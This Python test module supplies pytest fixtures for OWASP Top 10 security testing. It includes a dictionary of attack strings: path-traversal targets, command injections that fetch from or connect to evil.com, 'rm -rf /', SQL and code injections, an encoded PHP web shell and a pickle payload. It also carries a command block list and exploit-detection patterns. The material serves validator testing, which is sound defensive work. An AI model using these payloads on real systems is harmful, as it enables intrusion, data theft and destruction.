"""
Security testing fixtures.

Provides specialized fixtures for testing security vulnerabilities
based on OWASP Top 10 and common attack vectors.
"""

import pytest
from pathlib import Path
from typing import List, Dict, Callable, Any
import subprocess


@pytest.fixture
def owasp_attack_vectors():
    """
    Comprehensive OWASP Top 10 attack vectors.

    Returns dictionary organized by attack category.
    """
    return {
        # A01:2021 – Broken Access Control
        "path_traversal": [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\boot.ini",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            "file:///etc/passwd",
            "file://C:/Windows/System32/drivers/etc/hosts",
            "./../../../../../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\system32",
        ],

        # A02:2021 – Cryptographic Failures
        "sensitive_data_exposure": [
            ".env",
            ".git/config",
            ".ssh/id_rsa",
            ".aws/credentials",
            "secrets.json",
            "config/database.yml",
            "wp-config.php",
            ".htpasswd",
        ],

        # A03:2021 – Injection
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "|| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "; wget http://evil.com/shell.sh",
            "| nc evil.com 4444",
            "&& curl http://evil.com/backdoor",
            "; python -c 'import os; os.system(\"ls\")'",
            "'; DROP TABLE users;--",
            "' OR '1'='1",
            "admin' --",
            "1'; DROP TABLE users; --",
        ],

        "sql_injection": [
            "' OR '1'='1",
            "admin' --",
            "' OR '1'='1' --",
            "1' UNION SELECT NULL--",
            "'; DROP TABLE users;--",
            "1'; DROP TABLE users; --",
            "' OR 1=1--",
            "admin' OR '1'='1",
        ],

        "code_injection": [
            "__import__('os').system('whoami')",
            "eval('__import__(\"os\").system(\"ls\")')",
            "exec('import os; os.system(\"pwd\")')",
            "compile('print(1)', '<string>', 'exec')",
            "__builtins__.__dict__['eval']('print(1)')",
        ],

        # A04:2021 – Insecure Design
        "file_inclusion": [
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
            "file:///etc/passwd",
            "zip://archive.zip#file.txt",
        ],

        # A05:2021 – Security Misconfiguration
        "config_access": [
            ".git/HEAD",
            ".svn/entries",
            ".env",
            "web.config",
            "phpinfo.php",
            "server-status",
            ".DS_Store",
            "composer.json",
            "package.json",
        ],

        # A06:2021 – Vulnerable and Outdated Components
        "dependency_confusion": [
            "../../node_modules/.bin/malicious",
            "../../../lib/evil.so",
            "~/.local/lib/backdoor.py",
        ],

        # A08:2021 – Software and Data Integrity Failures
        "deserialization": [
            "__import__('os').system('ls')",
            "pickle.loads(b'cposix\\nsystem\\n(S\\'ls\\'\\ntR.')",
        ],

        # A09:2021 – Security Logging and Monitoring Failures
        "log_injection": [
            "user\nADMIN logged in",
            "data\n[ERROR] System compromised",
            "input\r\nFAKE LOG ENTRY",
        ],

        # Additional attack vectors
        "xxe_injection": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],

        "ldap_injection": [
            "*)(uid=*",
            "admin)(&(password=*)",
        ],

        "xpath_injection": [
            "' or '1'='1",
            "'] | //password | a['",
        ],

        "resource_exhaustion": [
            "../" * 10000,  # Deep path traversal
            "A" * 10_000_000,  # 10MB string
            "\n" * 1_000_000,  # Million newlines
        ],

        "null_byte_injection": [
            "file.txt\x00.png",
            "../../etc/passwd\x00.jpg",
        ],
    }


@pytest.fixture
def security_test_runner(owasp_attack_vectors):
    """
    Test runner for security vulnerabilities.

    Usage:
        runner = security_test_runner()
        runner.test_all_attacks(my_validator_function)
    """

    class SecurityTestRunner:
        def __init__(self, attack_vectors: Dict[str, List[str]]):
            self.attack_vectors = attack_vectors
            self.results = []

        def test_category(
            self,
            category: str,
            validator: Callable[[str], bool]
        ) -> Dict[str, Any]:
            """
            Test all attacks in a category.

            Args:
                category: Attack category (e.g., 'path_traversal')
                validator: Function that returns True if input is blocked

            Returns:
                Test results with passed/failed counts
            """
            if category not in self.attack_vectors:
                raise ValueError(f"Unknown category: {category}")

            passed = 0
            failed = 0
            failures = []

            for attack in self.attack_vectors[category]:
                try:
                    is_blocked = validator(attack)
                    if is_blocked:
                        passed += 1
                    else:
                        failed += 1
                        failures.append({
                            "attack": attack,
                            "reason": "Attack was not blocked"
                        })
                except Exception as e:
                    # Exception means attack was blocked (good)
                    passed += 1

            return {
                "category": category,
                "total": len(self.attack_vectors[category]),
                "passed": passed,
                "failed": failed,
                "failures": failures,
            }

        def test_all_attacks(self, validator: Callable[[str], bool]) -> Dict[str, Any]:
            """Test all attack categories."""
            results = {}

            for category in self.attack_vectors:
                results[category] = self.test_category(category, validator)

            return results

        def generate_report(self, results: Dict[str, Any]) -> str:
            """Generate security test report."""
            lines = ["# Security Test Report\n"]

            total_passed = sum(r["passed"] for r in results.values())
            total_failed = sum(r["failed"] for r in results.values())
            total_tests = total_passed + total_failed

            lines.append(f"**Overall**: {total_passed}/{total_tests} passed "
                        f"({(total_passed/total_tests*100):.1f}%)\n")

            for category, result in results.items():
                status = "✅" if result["failed"] == 0 else "❌"
                lines.append(f"\n## {status} {category}")
                lines.append(f"- Passed: {result['passed']}/{result['total']}")

                if result["failures"]:
                    lines.append("\n**Failures:**")
                    for failure in result["failures"]:
                        lines.append(f"- `{failure['attack']}`")
                        lines.append(f"  - {failure['reason']}")

            return "\n".join(lines)

    return SecurityTestRunner(owasp_attack_vectors)


@pytest.fixture
def sandbox_executor(tmp_path):
    """
    Execute code in a sandboxed environment for security testing.

    Usage:
        executor = sandbox_executor()
        result = executor.run_isolated(dangerous_function, timeout=5)
    """
    import signal
    import multiprocessing

    class TimeoutError(Exception):
        pass

    class SandboxExecutor:
        def __init__(self, workspace: Path):
            self.workspace = workspace

        def run_isolated(
            self,
            func: Callable,
            timeout: float = 5.0,
            *args,
            **kwargs
        ) -> Any:
            """
            Run function in isolated process with timeout.

            Args:
                func: Function to execute
                timeout: Max execution time in seconds
                *args, **kwargs: Arguments to pass to function

            Returns:
                Function result

            Raises:
                TimeoutError: If execution exceeds timeout
            """

            def wrapper(queue, func, args, kwargs):
                try:
                    result = func(*args, **kwargs)
                    queue.put(("success", result))
                except Exception as e:
                    queue.put(("error", str(e)))

            queue = multiprocessing.Queue()
            process = multiprocessing.Process(
                target=wrapper,
                args=(queue, func, args, kwargs)
            )

            process.start()
            process.join(timeout=timeout)

            if process.is_alive():
                process.terminate()
                process.join(timeout=1.0)
                if process.is_alive():
                    process.kill()
                raise TimeoutError(f"Execution exceeded {timeout}s timeout")

            if queue.empty():
                raise RuntimeError("No result from sandbox")

            status, value = queue.get()
            if status == "error":
                raise RuntimeError(f"Sandbox execution failed: {value}")

            return value

    return SandboxExecutor(tmp_path)


@pytest.fixture
def permission_tester(tmp_path):
    """
    Test file permission handling.

    Usage:
        tester = permission_tester()
        tester.test_readonly_protection(my_write_function)
    """

    class PermissionTester:
        def __init__(self, workspace: Path):
            self.workspace = workspace

        def create_readonly_file(self, name: str, content: str = "test") -> Path:
            """Create a read-only file."""
            file_path = self.workspace / name
            file_path.write_text(content)
            file_path.chmod(0o444)
            return file_path

        def create_readonly_dir(self, name: str) -> Path:
            """Create a read-only directory."""
            dir_path = self.workspace / name
            dir_path.mkdir()
            dir_path.chmod(0o555)
            return dir_path

        def test_readonly_protection(
            self,
            write_func: Callable[[Path], Any]
        ) -> bool:
            """
            Test if function properly handles read-only files.

            Args:
                write_func: Function that attempts to write to a path

            Returns:
                True if function properly rejects write, False otherwise
            """
            readonly_file = self.create_readonly_file("test.txt")

            try:
                write_func(readonly_file)
                # If no exception, protection failed
                readonly_file.chmod(0o644)  # Cleanup
                return False
            except (PermissionError, OSError):
                # Exception means protection worked
                readonly_file.chmod(0o644)  # Cleanup
                return True

    return PermissionTester(tmp_path)


@pytest.fixture
def input_validator():
    """
    Validate inputs against common malicious patterns.

    Usage:
        validator = input_validator()
        assert validator.is_safe_filename("test.txt")
        assert not validator.is_safe_filename("../../etc/passwd")
    """

    class InputValidator:
        @staticmethod
        def is_safe_filename(filename: str) -> bool:
            """Check if filename is safe."""
            dangerous_patterns = [
                "..",
                "/",
                "\\",
                "\x00",
                "|",
                ";",
                "&",
                "$(",
                "`",
            ]
            return not any(p in filename for p in dangerous_patterns)

        @staticmethod
        def is_safe_path(path: str, allowed_root: Path) -> bool:
            """Check if path is within allowed root."""
            try:
                resolved = Path(path).resolve()
                return str(resolved).startswith(str(allowed_root.resolve()))
            except Exception:
                return False

        @staticmethod
        def is_safe_command(command: str) -> bool:
            """Check if command is safe to execute."""
            dangerous = [
                "rm -rf",
                "dd if=",
                "mkfs",
                "> /dev/",
                "curl",
                "wget",
                "nc ",
                "netcat",
                "; rm",
                "| rm",
                "&& rm",
            ]
            command_lower = command.lower()
            return not any(d in command_lower for d in dangerous)

        @staticmethod
        def sanitize_input(input_str: str, max_length: int = 1000) -> str:
            """Sanitize user input."""
            # Truncate
            sanitized = input_str[:max_length]

            # Remove control characters
            sanitized = "".join(
                c for c in sanitized
                if c.isprintable() or c in ['\n', '\t']
            )

            # Remove null bytes
            sanitized = sanitized.replace('\x00', '')

            return sanitized

    return InputValidator()


@pytest.fixture
def exploit_detector():
    """
    Detect exploit attempts in logs and outputs.

    Usage:
        detector = exploit_detector()
        detector.scan_for_exploits(output_text)
    """

    class ExploitDetector:
        def __init__(self):
            self.exploit_signatures = {
                "shell_command": [r"\b(sh|bash|cmd|powershell)\b"],
                "file_access": [r"/etc/passwd", r"C:\\Windows\\System32"],
                "network": [r"\b(wget|curl|nc|netcat)\b"],
                "code_execution": [r"\b(eval|exec|system|shell_exec)\b"],
            }

        def scan_for_exploits(self, text: str) -> Dict[str, List[str]]:
            """
            Scan text for exploit signatures.

            Returns:
                Dictionary of detected exploit types and matches
            """
            import re

            detections = {}

            for exploit_type, patterns in self.exploit_signatures.items():
                matches = []
                for pattern in patterns:
                    found = re.findall(pattern, text, re.IGNORECASE)
                    matches.extend(found)

                if matches:
                    detections[exploit_type] = matches

            return detections

    return ExploitDetector()


@pytest.fixture
def resource_limiter():
    """
    Test resource limit enforcement.

    Usage:
        limiter = resource_limiter()
        limiter.test_memory_limit(my_function, max_mb=100)
    """

    class ResourceLimiter:
        def test_file_size_limit(
            self,
            func: Callable[[Path], Any],
            max_size_mb: float
        ) -> bool:
            """Test if function respects file size limits."""
            # Implementation would test large file handling
            pass

        def test_execution_time_limit(
            self,
            func: Callable,
            max_seconds: float
        ) -> bool:
            """Test if function respects time limits."""
            import time

            start = time.time()
            try:
                func()
                elapsed = time.time() - start
                return elapsed <= max_seconds
            except TimeoutError:
                return True  # Timeout was enforced

    return ResourceLimiter()
